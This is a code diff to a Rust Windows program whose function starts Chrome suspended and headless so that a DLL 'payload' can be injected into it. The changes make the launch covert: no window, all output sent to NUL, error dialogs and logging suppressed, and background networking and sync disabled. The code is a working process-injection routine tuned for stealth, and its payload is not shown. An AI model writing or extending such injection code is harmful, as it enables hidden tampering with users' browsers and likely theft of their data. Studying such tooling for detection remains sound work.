@@ -15,7 +15,10 @@ use std::{env, mem, os::windows::ffi::OsStrExt, ffi::OsStr, path::PathBuf, threa
 
 use windows::{
     Win32::{
-        Foundation::CloseHandle,
+        Foundation::{CloseHandle, HANDLE},
+        Storage::FileSystem::{
+            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
+        },
         System::{
             Diagnostics::{
                 Debug::WriteProcessMemory,
@@ -33,7 +36,7 @@ use windows::{
                 PROCESS_INFORMATION, PROCESS_NAME_WIN32,
                 PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
                 PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-                STARTUPINFOW,
+                STARTUPINFOW, STARTUPINFOW_FLAGS,
             },
         },
     },
@@ -110,28 +113,60 @@ fn spawn_suspended_and_inject(chrome_exe: &str, dll_path: &str) -> Result<u32, S
     let profile_str = tmp_profile.to_string_lossy();
 
     // Headless + remote-debugging keeps Chrome alive while our payload runs.
+    // Logging/sync/network flags suppress Chrome stderr noise (GCM, DevTools, etc.).
     let cmdline = format!(
         "\"{}\" --headless=new --disable-gpu \
+         --disable-logging --log-level=3 --silent-debug-dump \
+         --disable-background-networking --disable-sync --disable-default-apps \
+         --disable-features=PushMessaging,NotificationTriggers \
          --remote-debugging-port=0 --no-first-run \
-         --no-default-browser-check --user-data-dir=\"{profile_str}\"",
+         --no-default-browser-check --noerrdialogs \
+         --user-data-dir=\"{profile_str}\"",
         chrome_exe
     );
 
     let exe_w  = wide(chrome_exe);
     let mut cmd_w = wide(&cmdline);
 
-    let mut si = STARTUPINFOW { cb: mem::size_of::<STARTUPINFOW>() as u32, ..Default::default() };
+    let mut si = STARTUPINFOW {
+        cb: mem::size_of::<STARTUPINFOW>() as u32,
+        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100), // STARTF_USESTDHANDLES
+        ..Default::default()
+    };
     let mut pi = PROCESS_INFORMATION::default();
 
+    // CREATE_SUSPENDED | CREATE_NO_WINDOW
+    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;
+
     unsafe {
+        let nul = CreateFileW(
+            windows::core::w!("NUL"),
+            FILE_GENERIC_WRITE.0,
+            FILE_SHARE_WRITE,
+            None,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            HANDLE::default(),
+        )
+        .map_err(|e| format!("CreateFileW(NUL): {e}"))?;
+
+        si.hStdInput = nul;
+        si.hStdOutput = nul;
+        si.hStdError = nul;
+
         CreateProcessW(
             PCWSTR(exe_w.as_ptr()),
             PWSTR(cmd_w.as_mut_ptr()),
-            None, None, false,
-            PROCESS_CREATION_FLAGS(0x0000_0004), // CREATE_SUSPENDED
+            None, None, true,
+            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
             None, None,
             &si, &mut pi,
-        ).map_err(|e| format!("CreateProcessW: {e}"))?;
+        ).map_err(|e| {
+            let _ = CloseHandle(nul);
+            format!("CreateProcessW: {e}")
+        })?;
+
+        CloseHandle(nul).ok();
 
         let pid = pi.dwProcessId;
 
